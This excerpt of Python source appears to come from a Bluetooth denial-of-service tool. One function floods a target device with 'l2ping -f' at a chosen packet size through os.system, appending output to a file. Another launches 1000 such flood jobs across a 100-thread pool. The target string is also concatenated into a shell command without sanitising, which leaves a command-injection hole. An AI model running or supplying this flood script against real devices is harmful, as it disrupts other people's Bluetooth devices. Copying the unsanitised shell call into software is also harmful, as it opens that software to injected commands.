...
def l2pingDOS(id, target, packetsize):
    ...
    Return: Nothing
    """
    os.system('l2ping -i hci0 -s ' + str(packetsize) +' -f ' + str(target) + ' >> output.txt')

    print("Exiting Thread...", str(id))
...
def selectattack(target, attackType, numThreads=100, packetSize=600):
    ...
    if attackType == 1:
        ...
        # Threading
        executor = concurrent.futures.ThreadPoolExecutor(max_workers=int(numThreads))
        futures = [executor.submit(l2pingDOS, i, target, packetSize) for i in range(1000)]
